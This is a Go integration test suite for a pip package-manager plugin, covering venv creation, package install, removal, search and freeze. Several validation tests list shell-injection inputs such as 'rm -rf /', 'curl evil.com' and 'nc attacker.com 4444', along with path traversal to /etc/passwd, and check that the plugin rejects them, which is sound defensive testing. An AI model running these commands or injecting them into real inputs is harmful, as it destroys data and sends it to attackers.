//go:build integration

package main_test

import (
	"context"
	"os"
	"path/filepath"
	"time"

	. "github.com/onsi/ginkgo/v2"
	. "github.com/onsi/gomega"

	main "github.com/jameswlane/devex/packages/package-manager-pip"
)

var _ = Describe("Pip Package Manager Integration Tests", func() {
	var (
		plugin     *main.PipPlugin
		ctx        context.Context
		cancelFunc context.CancelFunc
		tmpDir     string
	)

	BeforeEach(func() {
		// Create context with timeout for all operations
		ctx, cancelFunc = context.WithTimeout(context.Background(), 60*time.Second)

		// Create temporary directory for test files
		var err error
		tmpDir, err = os.MkdirTemp("", "pip-integration-test-")
		Expect(err).NotTo(HaveOccurred())

		// Initialize plugin
		plugin = main.NewPipPlugin()
	})

	AfterEach(func() {
		cancelFunc()
		if tmpDir != "" {
			os.RemoveAll(tmpDir)
		}
	})

	Describe("Virtual Environment Management", func() {
		Context("when creating virtual environments", func() {
			It("should create a virtual environment with default name", func() {
				Skip("Requires Python venv module")

				// Change to tmpDir for this test
				originalDir, _ := os.Getwd()
				defer os.Chdir(originalDir)
				os.Chdir(tmpDir)

				err := plugin.Execute("create-venv", []string{})
				Expect(err).ToNot(HaveOccurred())

				// Verify venv directory was created
				venvPath := filepath.Join(tmpDir, "venv")
				Expect(venvPath).To(BeADirectory())

				// Verify virtual environment structure
				Expect(filepath.Join(venvPath, "pyvenv.cfg")).To(BeARegularFile())

				// On Unix-like systems
				if _, err := os.Stat(filepath.Join(venvPath, "bin")); err == nil {
					Expect(filepath.Join(venvPath, "bin", "python")).To(BeARegularFile())
					Expect(filepath.Join(venvPath, "bin", "pip")).To(BeARegularFile())
				}

				// On Windows
				if _, err := os.Stat(filepath.Join(venvPath, "Scripts")); err == nil {
					Expect(filepath.Join(venvPath, "Scripts", "python.exe")).To(BeARegularFile())
					Expect(filepath.Join(venvPath, "Scripts", "pip.exe")).To(BeARegularFile())
				}
			})

			It("should create a virtual environment with custom name", func() {
				Skip("Requires Python venv module")

				originalDir, _ := os.Getwd()
				defer os.Chdir(originalDir)
				os.Chdir(tmpDir)

				customName := "myenv"
				err := plugin.Execute("create-venv", []string{"--name=" + customName})
				Expect(err).ToNot(HaveOccurred())

				// Verify custom named venv was created
				venvPath := filepath.Join(tmpDir, customName)
				Expect(venvPath).To(BeADirectory())
			})

			It("should handle existing virtual environment directory", func() {
				Skip("Requires Python venv module")

				originalDir, _ := os.Getwd()
				defer os.Chdir(originalDir)
				os.Chdir(tmpDir)

				// Create directory first
				venvPath := filepath.Join(tmpDir, "venv")
				err := os.Mkdir(venvPath, 0755)
				Expect(err).ToNot(HaveOccurred())

				// Try to create venv - should handle existing directory
				err = plugin.Execute("create-venv", []string{})
				// Behavior depends on implementation - might overwrite or skip
			})

			It("should validate virtual environment names", func() {
				dangerousNames := []string{
					"../../../dangerous",
					"/etc/passwd",
					"name; rm -rf /",
					"name && curl evil.com",
					"name | nc attacker.com 4444",
					"name`whoami`",
					"name$(rm -rf /)",
					"name\nrm -rf /",
					"",    // Empty
					"con", // Windows reserved name
					"prn", // Windows reserved name
				}

				for _, name := range dangerousNames {
					err := plugin.Execute("create-venv", []string{"--name=" + name})
					Expect(err).To(HaveOccurred())
					Expect(err.Error()).To(ContainSubstring("invalid"))
				}
			})
		})
	})

	Describe("Package Installation Flow", func() {
		Context("when installing valid packages", func() {
			It("should successfully install a single package", func() {
				Skip("Requires pip and network access")

				packageName := "requests"
				err := plugin.Execute("install", []string{packageName})
				Expect(err).ToNot(HaveOccurred())

				// Verify installation
				err = plugin.Execute("is-installed", []string{packageName})
				Expect(err).ToNot(HaveOccurred())
			})

			It("should successfully install multiple packages", func() {
				Skip("Requires pip and network access")

				packages := []string{"requests", "click", "colorama"}
				err := plugin.Execute("install", packages)
				Expect(err).ToNot(HaveOccurred())

				// Verify all packages are installed
				for _, pkg := range packages {
					err = plugin.Execute("is-installed", []string{pkg})
					Expect(err).ToNot(HaveOccurred())
				}
			})

			It("should install to user directory when requested", func() {
				Skip("Requires pip and network access")

				packageName := "requests"
				err := plugin.Execute("install", []string{packageName, "--user"})
				Expect(err).ToNot(HaveOccurred())

				// Verify package is installed in user directory
				err = plugin.Execute("is-installed", []string{packageName})
				Expect(err).ToNot(HaveOccurred())
			})

			It("should upgrade packages when requested", func() {
				Skip("Requires pip and network access")

				packageName := "pip"
				err := plugin.Execute("install", []string{packageName, "--upgrade"})
				Expect(err).ToNot(HaveOccurred())
			})

			It("should install from requirements.txt file", func() {
				Skip("Requires pip and network access")

				// Create test requirements.txt
				requirementsPath := filepath.Join(tmpDir, "requirements.txt")
				requirementsContent := `requests>=2.25.0
click>=7.0
colorama>=0.4.0
`
				err := os.WriteFile(requirementsPath, []byte(requirementsContent), 0644)
				Expect(err).ToNot(HaveOccurred())

				err = plugin.Execute("install", []string{
					"--requirements=" + requirementsPath,
				})
				Expect(err).ToNot(HaveOccurred())

				// Verify packages from requirements are installed
				packages := []string{"requests", "click", "colorama"}
				for _, pkg := range packages {
					err = plugin.Execute("is-installed", []string{pkg})
					Expect(err).ToNot(HaveOccurred())
				}
			})

			It("should handle already installed packages gracefully", func() {
				Skip("Requires pip with pre-installed package")

				// Try to install pip itself (usually already installed)
				err := plugin.Execute("install", []string{"pip"})
				Expect(err).ToNot(HaveOccurred())
			})
		})

		Context("when installing invalid packages", func() {
			It("should fail for non-existent packages", func() {
				Skip("Requires pip and network access")

				err := plugin.Execute("install", []string{"nonexistent-package-xyz-123"})
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(ContainSubstring("not found"))
			})

			It("should validate package names", func() {
				dangerousPackages := []string{
					"package; rm -rf /",
					"package && curl evil.com",
					"package | nc attacker.com 4444",
					"package`whoami`",
					"package$(rm -rf /)",
					"package\nrm -rf /",
					"package\t; evil-command",
					"", // Empty
				}

				for _, pkg := range dangerousPackages {
					err := plugin.Execute("install", []string{pkg})
					Expect(err).To(HaveOccurred())
					Expect(err.Error()).To(ContainSubstring("invalid"))
				}
			})

			It("should validate requirements file paths", func() {
				dangerousPaths := []string{
					"../../../etc/passwd",
					"/etc/shadow",
					"path; rm -rf /",
					"path && curl evil.com",
					"", // Empty
				}

				for _, path := range dangerousPaths {
					err := plugin.Execute("install", []string{
						"--requirements=" + path,
					})
					Expect(err).To(HaveOccurred())
					Expect(err.Error()).To(ContainSubstring("invalid"))
				}
			})

			It("should handle missing requirements file", func() {
				nonExistentFile := filepath.Join(tmpDir, "nonexistent-requirements.txt")
				err := plugin.Execute("install", []string{
					"--requirements=" + nonExistentFile,
				})
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(ContainSubstring("not found"))
			})

			It("should require package names or requirements file", func() {
				err := plugin.Execute("install", []string{})
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(ContainSubstring("package"))
			})
		})

		Context("with virtual environments", func() {
			It("should detect and use active virtual environment", func() {
				Skip("Requires virtual environment setup")

				// This would test that pip operations use the active venv
				// when VIRTUAL_ENV environment variable is set
			})

			It("should install packages in virtual environment", func() {
				Skip("Requires virtual environment setup")

				// Create virtual environment first
				originalDir, _ := os.Getwd()
				defer os.Chdir(originalDir)
				os.Chdir(tmpDir)

				err := plugin.Execute("create-venv", []string{})
				Expect(err).ToNot(HaveOccurred())

				// Activate virtual environment and install package
				// This is complex to test as it requires environment manipulation
			})
		})
	})

	Describe("Package Removal Flow", func() {
		Context("when removing installed packages", func() {
			It("should successfully remove an installed package", func() {
				Skip("Requires pip with installed package")

				packageName := "requests"

				// Install first
				err := plugin.Execute("install", []string{packageName})
				Expect(err).ToNot(HaveOccurred())

				// Remove the package
				err = plugin.Execute("remove", []string{packageName})
				Expect(err).ToNot(HaveOccurred())

				// Verify removal
				err = plugin.Execute("is-installed", []string{packageName})
				Expect(err).To(HaveOccurred()) // Should fail because package is not installed
			})

			It("should handle removal of non-installed packages", func() {
				err := plugin.Execute("remove", []string{"nonexistent-package-xyz"})
				// Pip might not fail for non-existent packages, depending on version
			})

			It("should confirm removal when requested", func() {
				Skip("Requires pip with installed package")

				packageName := "requests"
				err := plugin.Execute("remove", []string{packageName, "--yes"})
				// Should proceed without prompting for confirmation
			})
		})

		Context("when removing invalid packages", func() {
			It("should validate package names for removal", func() {
				dangerousPackages := []string{
					"package; rm -rf /",
					"package && curl evil.com",
					"package\nrm -rf /",
					"", // Empty
				}

				for _, pkg := range dangerousPackages {
					err := plugin.Execute("remove", []string{pkg})
					Expect(err).To(HaveOccurred())
					Expect(err.Error()).To(ContainSubstring("invalid"))
				}
			})

			It("should require package names for removal", func() {
				err := plugin.Execute("remove", []string{})
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(ContainSubstring("package"))
			})
		})
	})

	Describe("Package Query Operations", func() {
		Context("package search", func() {
			It("should search for packages", func() {
				Skip("Requires pip and network access - PyPI search may be limited")

				err := plugin.Execute("search", []string{"requests"})
				// Note: PyPI search has been disabled, so this might not work
				// Behavior depends on pip version and implementation
			})

			It("should handle search with no results", func() {
				Skip("Requires pip and network access")

				err := plugin.Execute("search", []string{"nonexistent-package-xyz-123"})
				// Search might not fail even with no results
			})

			It("should require search terms", func() {
				err := plugin.Execute("search", []string{})
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(ContainSubstring("search term"))
			})

			It("should validate search terms", func() {
				dangerousTerms := []string{
					"term; rm -rf /",
					"term && curl evil.com",
					"term\nrm -rf /",
				}

				for _, term := range dangerousTerms {
					err := plugin.Execute("search", []string{term})
					Expect(err).To(HaveOccurred())
					Expect(err.Error()).To(ContainSubstring("invalid"))
				}
			})
		})

		Context("package listing", func() {
			It("should list installed packages", func() {
				Skip("Requires pip installation")

				err := plugin.Execute("list", []string{})
				Expect(err).ToNot(HaveOccurred())
			})

			It("should list only outdated packages when requested", func() {
				Skip("Requires pip installation")

				err := plugin.Execute("list", []string{"--outdated"})
				Expect(err).ToNot(HaveOccurred())
			})

			It("should format output as requested", func() {
				Skip("Requires pip installation")

				formats := []string{"columns", "freeze", "json"}

				for _, format := range formats {
					err := plugin.Execute("list", []string{"--format=" + format})
					Expect(err).ToNot(HaveOccurred())
				}
			})

			It("should validate format parameter", func() {
				invalidFormats := []string{
					"invalid-format",
					"format; rm -rf /",
					"format && curl evil.com",
					"", // Empty
				}

				for _, format := range invalidFormats {
					err := plugin.Execute("list", []string{"--format=" + format})
					Expect(err).To(HaveOccurred())
					Expect(err.Error()).To(ContainSubstring("invalid"))
				}
			})
		})

		Context("installation status check", func() {
			It("should check if packages are installed", func() {
				Skip("Requires pip with installed packages")

				// Check a commonly installed package like pip itself
				err := plugin.Execute("is-installed", []string{"pip"})
				Expect(err).ToNot(HaveOccurred())
			})

			It("should fail for non-installed packages", func() {
				err := plugin.Execute("is-installed", []string{"nonexistent-package-xyz"})
				Expect(err).To(HaveOccurred())
			})

			It("should validate package names for installation check", func() {
				dangerousPackages := []string{
					"package; rm -rf /",
					"package\nrm -rf /",
					"", // Empty
				}

				for _, pkg := range dangerousPackages {
					err := plugin.Execute("is-installed", []string{pkg})
					Expect(err).To(HaveOccurred())
					Expect(err.Error()).To(ContainSubstring("invalid"))
				}
			})

			It("should require package names for installation check", func() {
				err := plugin.Execute("is-installed", []string{})
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(ContainSubstring("package"))
			})
		})
	})

	Describe("Requirements Management", func() {
		Context("generating requirements.txt", func() {
			It("should generate requirements from installed packages", func() {
				Skip("Requires pip with installed packages")

				err := plugin.Execute("freeze", []string{})
				Expect(err).ToNot(HaveOccurred())
				// Should output package list in requirements.txt format
			})

			It("should write requirements to file when specified", func() {
				Skip("Requires pip with installed packages")

				requirementsPath := filepath.Join(tmpDir, "generated-requirements.txt")

				// Implementation would need to support output file parameter
				// This is a potential enhancement to the freeze command
			})
		})

		Context("requirements file validation", func() {
			It("should parse valid requirements.txt files", func() {
				Skip("Requires pip and network access")

				requirementsPath := filepath.Join(tmpDir, "valid-requirements.txt")
				requirementsContent := `# This is a comment
requests>=2.25.0
click==7.1.2
colorama~=0.4.0
django>=3.0,<4.0
`
				err := os.WriteFile(requirementsPath, []byte(requirementsContent), 0644)
				Expect(err).ToNot(HaveOccurred())

				err = plugin.Execute("install", []string{
					"--requirements=" + requirementsPath,
				})
				Expect(err).ToNot(HaveOccurred())
			})

			It("should handle malformed requirements files gracefully", func() {
				malformedPath := filepath.Join(tmpDir, "malformed-requirements.txt")
				malformedContent := `invalid package specification
package-name-without-version-spec-and-invalid-chars!@#$
`
				err := os.WriteFile(malformedPath, []byte(malformedContent), 0644)
				Expect(err).ToNot(HaveOccurred())

				err = plugin.Execute("install", []string{
					"--requirements=" + malformedPath,
				})
				Expect(err).To(HaveOccurred())
			})
		})
	})

	Describe("System Update Operations", func() {
		Context("pip updates", func() {
			It("should update pip itself", func() {
				Skip("Requires pip installation and network access")

				err := plugin.Execute("update", []string{})
				Expect(err).ToNot(HaveOccurred())
			})

			It("should update all installed packages", func() {
				Skip("Requires pip with installed packages and network access")

				err := plugin.Execute("update", []string{"--all"})
				Expect(err).ToNot(HaveOccurred())
			})

			It("should handle update failures gracefully", func() {
				Skip("Requires controlled network environment")

				// Test behavior when updates fail due to network issues
			})
		})
	})

	Describe("Multi-Step Workflows", func() {
		Context("complete development setup workflow", func() {
			It("should complete venv -> requirements -> install -> freeze workflow", func() {
				Skip("Requires pip, venv module, and network access")

				originalDir, _ := os.Getwd()
				defer os.Chdir(originalDir)
				os.Chdir(tmpDir)

				// Create virtual environment
				err := plugin.Execute("create-venv", []string{"--name=testenv"})
				Expect(err).ToNot(HaveOccurred())

				// Create requirements file
				requirementsPath := filepath.Join(tmpDir, "requirements.txt")
				requirementsContent := "requests>=2.25.0\nclick>=7.0\n"
				err = os.WriteFile(requirementsPath, []byte(requirementsContent), 0644)
				Expect(err).ToNot(HaveOccurred())

				// Install from requirements
				err = plugin.Execute("install", []string{
					"--requirements=" + requirementsPath,
				})
				Expect(err).ToNot(HaveOccurred())

				// Verify installations
				err = plugin.Execute("is-installed", []string{"requests"})
				Expect(err).ToNot(HaveOccurred())

				err = plugin.Execute("is-installed", []string{"click"})
				Expect(err).ToNot(HaveOccurred())

				// Generate new requirements
				err = plugin.Execute("freeze", []string{})
				Expect(err).ToNot(HaveOccurred())
			})
		})

		Context("package lifecycle workflow", func() {
			It("should complete install -> check -> upgrade -> remove workflow", func() {
				Skip("Requires pip and network access")

				packageName := "colorama"

				// Install package
				err := plugin.Execute("install", []string{packageName})
				Expect(err).ToNot(HaveOccurred())

				// Check installation
				err = plugin.Execute("is-installed", []string{packageName})
				Expect(err).ToNot(HaveOccurred())

				// List packages (should include our package)
				err = plugin.Execute("list", []string{})
				Expect(err).ToNot(HaveOccurred())

				// Upgrade package
				err = plugin.Execute("install", []string{packageName, "--upgrade"})
				Expect(err).ToNot(HaveOccurred())

				// Remove package
				err = plugin.Execute("remove", []string{packageName, "--yes"})
				Expect(err).ToNot(HaveOccurred())

				// Verify removal
				err = plugin.Execute("is-installed", []string{packageName})
				Expect(err).To(HaveOccurred())
			})
		})
	})

	Describe("Context Cancellation", func() {
		Context("with timeout context", func() {
			It("should respect context cancellation during operations", func() {
				Skip("Requires integration with actual pip system")

				// Test that long-running operations like large package installations
				// can be cancelled without leaving the system in a bad state
			})
		})
	})

	Describe("Error Handling and Recovery", func() {
		Context("network failures", func() {
			It("should handle network failures during installation", func() {
				Skip("Requires controlled network environment")

				// Test behavior when PyPI is unreachable
			})

			It("should handle timeout during large package installation", func() {
				Skip("Requires controlled network environment")

				// Test behavior when package installation times out
			})
		})

		Context("permission failures", func() {
			It("should handle permission failures for system installation", func() {
				Skip("Requires controlled permission environment")

				// Test behavior when user lacks permissions for system-wide installation
			})

			It("should suggest alternatives when system installation fails", func() {
				Skip("Requires controlled permission environment")

				// Test that error messages suggest --user flag when system install fails
			})
		})

		Context("dependency conflicts", func() {
			It("should handle dependency resolution failures", func() {
				Skip("Requires controlled package environment")

				// Test behavior when package dependencies cannot be resolved
			})

			It("should provide informative error messages for conflicts", func() {
				Skip("Requires controlled package environment")

				// Test that dependency conflict errors are understandable
			})
		})
	})

	Describe("Command Validation", func() {
		Context("unknown commands", func() {
			It("should reject unknown commands", func() {
				err := plugin.Execute("unknown-command", []string{})
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(ContainSubstring("unknown command"))
			})
		})

		Context("command injection prevention", func() {
			It("should prevent shell injection in all command paths", func() {
				commands := []string{
					"install", "remove", "search", "list", "is-installed",
					"create-venv", "freeze",
				}

				dangerousArgs := []string{
					"arg; rm -rf /",
					"arg && curl evil.com",
					"arg | nc attacker.com 4444",
					"arg`whoami`",
					"arg$(rm -rf /)",
					"arg\nrm -rf /",
				}

				for _, cmd := range commands {
					for _, arg := range dangerousArgs {
						if cmd == "search" && arg == "" {
							continue // search requires non-empty args
						}

						err := plugin.Execute(cmd, []string{arg})
						Expect(err).To(HaveOccurred())
						// Should fail due to validation, not execute dangerous commands
					}
				}
			})
		})
	})

	Describe("Error Message Quality", func() {
		Context("user-friendly error messages", func() {
			It("should provide actionable error messages", func() {
				// Test that error messages are helpful and not just technical
				err := plugin.Execute("install", []string{})
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(ContainSubstring("package"))

				err = plugin.Execute("unknown-command", []string{})
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(ContainSubstring("unknown command"))
			})

			It("should include context in error messages", func() {
				dangerousPackage := "package; rm -rf /"
				err := plugin.Execute("install", []string{dangerousPackage})
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(ContainSubstring("invalid"))
				// Should include information about what was invalid
			})

			It("should provide installation suggestions", func() {
				Skip("Requires implementation of suggestion system")

				// Test that when packages are not found, similar package names are suggested
			})
		})
	})

	Describe("Environment Detection", func() {
		Context("Python environment detection", func() {
			It("should detect active virtual environment", func() {
				Skip("Requires virtual environment setup")

				// Test that the plugin correctly detects when running in a venv
				// and uses the appropriate pip binary
			})

			It("should detect Python version compatibility", func() {
				Skip("Requires multiple Python versions")

				// Test that the plugin works with different Python versions
			})

			It("should handle missing pip gracefully", func() {
				Skip("Requires environment without pip")

				// Test behavior when pip is not installed
			})
		})
	})

	Describe("System State Verification", func() {
		Context("after operations complete", func() {
			It("should verify package state after installation", func() {
				Skip("Requires pip system and comprehensive state checking")

				// Verify that after installation:
				// - Package files are in expected locations
				// - Dependencies are satisfied
				// - Module can be imported
			})

			It("should verify cleanup after removal", func() {
				Skip("Requires pip system and comprehensive state checking")

				// Verify that after removal:
				// - Package files are removed
				// - Dependencies are cleaned up if not needed
				// - Module cannot be imported
			})

			It("should verify virtual environment isolation", func() {
				Skip("Requires virtual environment testing")

				// Verify that packages installed in venv don't affect system Python
			})
		})
	})
})
